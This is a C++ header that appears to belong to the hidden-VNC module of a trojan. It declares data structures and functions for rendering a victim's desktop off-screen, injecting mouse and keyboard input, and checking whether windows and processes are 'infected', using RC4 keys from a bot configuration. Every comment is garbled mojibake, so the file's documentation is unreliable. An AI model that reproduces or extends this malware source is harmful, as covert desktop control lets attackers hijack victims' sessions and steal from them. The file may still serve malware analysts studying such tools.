/*
  ��������� ������ VNC.
*/
#pragma once

#if(BO_VNC > 0)

//������������ ������ �������.
#define MAX_BITMAP_SIZE (4000 * 4000 * 4)

//����� ���������.
#define MOUSE_DOUBLE_CLICK_DELAY 1000

//������� ��� SendMessageTimeoutW().
#define SENDMESSAGE_TIMEOUT 100

//�������, ��� ����� �������� � VNC-��������.
#define IS_VNC_PROCESS (coreData.proccessFlags & Core::CDPF_VNC_ACTIVE && Core::isActive())

//���� ��������� VNC (wParam).
enum vncMessages:WPARAM
{
  VMW_EXECUTE_MENU    = (WPARAM)-1, //��������� ������� ����
  VMW_HILITE_MENU     = (WPARAM)-2, //���������� ������� ����.
  VMW_UPDATE_KEYSTATE = (WPARAM)-3, //�������� ��������� ������ ��� ������.
  VMW_REMOTE_PAINT    = (WPARAM)-4  //����������� ������������� ������� � lParam
};

//����� ������� ����.
enum
{
  WCF_PAINTMETHOD_NOP         = 0x01, //�� ��������.
  WCF_PAINTMETHOD_PAINT       = 0x02, //�������� BeginPaint/EndPaint � �.�.
  WCF_PAINTMETHOD_PRINT       = 0x04, //WM_PRINT.
  WCF_PAINTMETHOD_PRINTWINDOW = 0x08, //PrintWindow.
  WCF_PAINTMETHOD_SKIP_HOOK   = 0x10, //�� ������� ����� VNCPROCESSDATA.vncMessage.
  WCF_MOUSE_CLIENT_TO_SCREEN  = 0x20, //���������� ��� ������� ��������� � ������������ ����������� ������.
  WCF_MOUSE_AUTOCAPTURE       = 0x40, //������������� ��������� SetCapture ��� ��������� ��������� ���� �� ����.
};

//���������� ������ VNC, ������������� ��� OBJECT_ID_VNC_DATA_MAPFILE.
typedef struct
{
  BYTE keysState[256];      //���������� ������ ���� � ����������.
  POINT cursorPoint;        //��������� �������.
  
  //������ ��� �������� SetCapture().
  struct
  {
    HWND window; //���� � ������������ ��������.
    DWORD tid;   //TID ���� � ��������.
    WORD area;   //������� � ������� ������� ������, ������ ������ ��� ����������� ����.
  }mouseCapture;

  //������ ��� �������� ���������.
  struct
  {
    RECT ownerRect;  //���������� �������� ����.
    bool retVal;     //��� �������� ���������.
  }paintProcess;
}VNCGLOBALDATA;

//������ VNC-��������.
typedef struct
{
  HANDLE mapFileHandle;      //����� map-����� ��� ���� ���������. (Core::OBJECT_ID_VNC_MAPFILE)
  DWORD tlsPaintIndex;       //TLS-������ PAINTDATA.
  DWORD vncMessage;          //������� ��������� ��� ����������� ��������� ���� ��� ���������� ��������� ���������� ������
  HANDLE vncMessageEvent;    //������� ��������� ���������� vncMessage.
  VNCGLOBALDATA *globalData; //���������� ������.
  HANDLE globalDataMutex;    //������ ��� globaData.
  
  //������ ��� ������ � DIB.
  struct
  {
    LPBYTE desktop;       //������ ��������, ������� �������� ��� VNC-�������.

    //��������� ������, � ������� �������� ������ ���� �� �����������.
    HBITMAP tempHandle;   //�����.
    LPBYTE temp;          //�����.

    RECT rect;            //���������� �������� (0, 0, width, height).
    DWORD widthInBytes;   //������ ������� � ��������, ������� ������������.
    BYTE pixelSize;       //������ ������� � ������.
  }dib;

  //������ VNC-�������. ������������ ��������� �������.
  struct
  {    
    //������ ����������� ��� ����������� ���������� ���������. 
    struct
    {
      GUID osGuid;             //PESETTINGS.osGuid.
      DWORD processInfecionId; //PESETTINGS.processInfecionId.
      Crypt::RC4KEY baseKey;   //BASECONFIG.rc4Key.
    }processDetectionData;

    //DC
    struct
    {
      HDC dc;                            //Memory DC � ������� ����� ���������� �������.
      HBITMAP orginalBitmap;             //�������������� ������.
      HBITMAP sampleBitmap;              //������ � ���������� ���������� �����.
      HANDLE paintMutex;                 //������ ��������� ����.
    }dcData;

    //��������� ����.
    struct
    {
      DWORD lastDownTime;      //����� ����������� ������� ������ ����.
      DWORD lastDownMessage;   //��������� ���������� ������� ������ ����.
      HWND lastDownWindow;     //����, � ������� ��� ����������� �������.
      HWND lastTopLevelWindow; //��������� TOP-����, � ������� ���������� �������.
      HWND lastActiveWindow;
      DWORD lastActiveThreadId;
    }input;

    PROCESS_INFORMATION paintProcess; //������ �������� ���������.
  }serverData;
}VNCPROCESSDATA;

extern VNCPROCESSDATA vncActiveProcessData;

////////////////////////////////////////////////////////////////////////////////////////////////////
//�������.
////////////////////////////////////////////////////////////////////////////////////////////////////

/*
  ��������� ��������.

  IN vncProcessData - VNCPROCESSDATA.
*/
void paintDesktop(VNCPROCESSDATA *vncProcessData);

/*
  ��������� ����.
  
  IN vncProcessData - VNCPROCESSDATA.
  IN window         - ���� ��� ������.
  IN visibleRect    - ������� ������� ��� ����.
  IN isServer       - true - ������� ������� � �������,
                      false - ������� ������� � ����������� ��������.
  
  Return            - true - ���� ����������/���������,
                      false - ���� �� ����������.
*/
bool paintWindow(VNCPROCESSDATA *vncProcessData, HWND window, const RECT *visibleRect, bool isServer);

/*
  ��������� ��������� ����.

  IN vncProcessData - VNCPROCESSDATA.
  IN flags          - Rfb::MOUSEEVENTF_*.
  IN x              - X.
  IN y              - Y.
  IN data           - ��������������� ������, �������� ��������� RFB.
*/
void mouseMessage(VNCPROCESSDATA *vncProcessData, DWORD flags, LONG x, LONG y, DWORD data);

/*
  ��������� ��������� ����������.

  IN vncProcessData - VNCPROCESSDATA.
  IN keySym         - KeySym.
  IN down           - true - �������, false - ����������.
*/
void keyboardMessage(VNCPROCESSDATA *vncProcessData, DWORD keySym, bool down);

/*
  ���������� ��������� ������ ���� � ����������.

  IN OUT vncProcessData - VNCPROCESSDATA.
  IN virtualKey         - ������� ��� ���������, 0 - ���� �� ���� �������� �� �����.
  IN down               - true - ������ �������, false - ��������� �������.

  Return                - ������� ����� MK_* ��� ������� ���������.
*/
WORD updateInputState(VNCPROCESSDATA *vncProcessData, BYTE virtualKey, bool down);

/*
  �������� ����� ��������� ����.

  IN window - ����.

  Return - PWM_*.
*/
WORD getWindowClassFlags(HWND window);

/*
  ��������� ������������ �� ������� ����.

  IN vncProcessData - VNCPROCESSDATA.
  IN window         - ����.

  Return            - true - ������������,
                      false - �� ������������.
*/
bool isWindowInfected(VNCPROCESSDATA *vncProcessData, HWND window);

#endif
